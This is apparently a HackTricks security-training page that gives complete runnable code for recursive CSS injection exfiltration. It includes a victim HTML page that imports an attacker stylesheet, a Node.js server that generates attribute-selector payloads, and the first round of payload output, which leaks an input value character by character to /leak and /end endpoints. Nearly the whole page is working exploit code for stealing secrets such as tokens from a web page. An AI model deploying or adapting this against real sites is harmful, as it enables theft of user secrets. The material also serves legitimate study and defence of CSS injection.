# CSS Injection Code

{{#include ../../../banners/hacktricks-training.md}}

This runnable example implements recursive CSS exfiltration. The victim imports an attacker-controlled stylesheet; attribute selectors test one prefix and suffix character at a time, and matching selectors request `/leak` until the complete value triggers `/end`.<sup>[[1]](#references)[[2]](#references)</sup>

```html:victim.html
<!DOCTYPE html>
<body>
  <div>
    <article>
      <div>
        <p></p>
        <div>
          <div>
            <div>
              <div>
                <div>
                  <input type="text" value="1234567890" />
                  <style>
                    @import url("//localhost:5001/start?");
                  </style>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </article>
  </div>
</body>
```

```javascript:server.js
const http = require("http")
const url = require("url")

// Port to exfiltrate to
const port = 5001
// Host to exfiltrate to
const HOSTNAME = "http://localhost:5001"
const DEBUG = false

var prefix = "",
  postfix = ""
var pending = []
var stop = false,
  ready = 0,
  n = 0

const requestHandler = (request, response) => {
  let req = url.parse(request.url, true)
  log("\treq: %s", request.url)

  // If stop is set, leakage is finished
  if (stop) return response.end()

  switch (req.pathname) {
    // This is only requested when leakage starts
    case "/start":
      genResponse(response)
      break

    // Every time a prefix or suffix character is leaked
    case "/leak":
      response.end()
      // A pre parameter extends the known prefix: s(E)cret
      if (req.query.pre && prefix !== req.query.pre) {
        prefix = req.query.pre

        // A post parameter extends the known suffix: secre(T)
      } else if (req.query.post && postfix !== req.query.post) {
        postfix = req.query.post
      } else {
        break
      }

      // Wait for both prefix and suffix probes before responding to the pending @import
      if (ready == 2) {
        genResponse(pending.shift())
        ready = 0
      } else {
        ready++
        log("\tleak: waiting others...")
      }
      break

    // While waiting for a pre and a post, the next @import is waiting to be responded
    // by a new generated payload with another "pre" and "post"
    case "/next":
      if (ready == 2) {
        genResponse(response)
        ready = 0
      } else {
        pending.push(response)
        ready++
        log("\tquery: waiting others...")
      }
      break

    // Called when the secret is leaked
    case "/end":
      stop = true
      console.log("[+] END: %s", req.query.token)

    default:
      response.end()
  }
}

const genResponse = (response) => {
  // Verbose output showing the characters recovered so far
  console.log("...pre-payload: " + prefix)
  console.log("...post-payload: " + postfix)

  // Payload generation; an example response is shown below
  let css =
    "@import url(" +
    HOSTNAME +
    "/next?" +
    Math.random() +
    ");\n" +
    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"]
      .map(
        (e) =>
          'input[value$="' +
          e +
          postfix +
          '"]{--e' +
          n +
          ":url(" +
          HOSTNAME +
          "/leak?post=" +
          e +
          postfix +
          ")}"
      )
      .join("") +
    "div ".repeat(n) +
    "input{background:var(--e" +
    n +
    ")}" +
    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"]
      .map(
        (e) =>
          'input[value^="' +
          prefix +
          e +
          '"]{--s' +
          n +
          ":url(" +
          HOSTNAME +
          "/leak?pre=" +
          prefix +
          e +
          ")}"
      )
      .join("") +
    "div ".repeat(n) +
    "input{border-image:var(--s" +
    n +
    ")}" +
    "input[value=" +
    prefix +
    postfix +
    "]{list-style:url(" +
    HOSTNAME +
    "/end?token=" +
    prefix +
    postfix +
    "&)};"

  response.writeHead(200, { "Content-Type": "text/css" })
  response.write(css)
  response.end()
  n++
}

// Server listening
const server = http.createServer(requestHandler)

server.listen(port, (err) => {
  if (err) {
    return console.log("[-] Error: something bad happened", err)
  }
  console.log("[+] Server is listening on %d", port)
})

function log() {
  if (DEBUG) console.log.apply(console, arguments)
}

/*
HTTP/1.1 200 OK
Content-Type: text/css
Date: Fri, 01 Apr 2022 14:35:39 GMT
Connection: close
Content-Length: 2149

@import url(http://localhost:5001/next?0.7834603960990516);
input[value$="0"]{--e0:url(http://localhost:5001/leak?post=0)}
input[value$="1"]{--e0:url(http://localhost:5001/leak?post=1)}
input[value$="2"]{--e0:url(http://localhost:5001/leak?post=2)}
input[value$="3"]{--e0:url(http://localhost:5001/leak?post=3)}
input[value$="4"]{--e0:url(http://localhost:5001/leak?post=4)}
input[value$="5"]{--e0:url(http://localhost:5001/leak?post=5)}
input[value$="6"]{--e0:url(http://localhost:5001/leak?post=6)}
input[value$="7"]{--e0:url(http://localhost:5001/leak?post=7)}
input[value$="8"]{--e0:url(http://localhost:5001/leak?post=8)}
input[value$="9"]{--e0:url(http://localhost:5001/leak?post=9)}
input[value$="a"]{--e0:url(http://localhost:5001/leak?post=a)}
input[value$="b"]{--e0:url(http://localhost:5001/leak?post=b)}
input[value$="c"]{--e0:url(http://localhost:5001/leak?post=c)}
input[value$="d"]{--e0:url(http://localhost:5001/leak?post=d)}
input[value$="e"]{--e0:url(http://localhost:5001/leak?post=e)}
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
input{background:var(--e0)}
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}
input[value^="1"]{--s0:url(http://localhost:5001/leak?pre=1)}
input[value^="2"]{--s0:url(http://localhost:5001/leak?pre=2)}
input[value^="3"]{--s0:url(http://localhost:5001/leak?pre=3)}
input[value^="4"]{--s0:url(http://localhost:5001/leak?pre=4)}
input[value^="5"]{--s0:url(http://localhost:5001/leak?pre=5)}
input[value^="6"]{--s0:url(http://localhost:5001/leak?pre=6)}
input[value^="7"]{--s0:url(http://localhost:5001/leak?pre=7)}
input[value^="8"]{--s0:url(http://localhost:5001/leak?pre=8)}
input[value^="9"]{--s0:url(http://localhost:5001/leak?pre=9)}
input[value^="a"]{--s0:url(http://localhost:5001/leak?pre=a)}
input[value^="b"]{--s0:url(http://localhost:5001/leak?pre=b)}
input[value^="c"]{--s0:url(http://localhost:5001/leak?pre=c)}
input[value^="d"]{--s0:url(http://localhost:5001/leak?pre=d)}
input[value^="e"]{--s0:url(http://localhost:5001/leak?pre=e)}
input[value^="f"]{--s0:url(http://localhost:5001/leak?pre=f)}
input{border-image:var(--s0)}
input[value=]{list-style:url(http://localhost:5001/end?token=&)};
*/

```

The response block above is the complete first-round output. Subsequent rounds use the same selector set with the recovered prefix and suffix incorporated into each probe.

## References

- [1] [LINE CTF 2022 - CSS/XS-Leak writeup and recursive exfiltration code](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [2] [Pepe Vila - Recursive CSS exfiltration proof of concept](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231)

{{#include ../../../banners/hacktricks-training.md}}
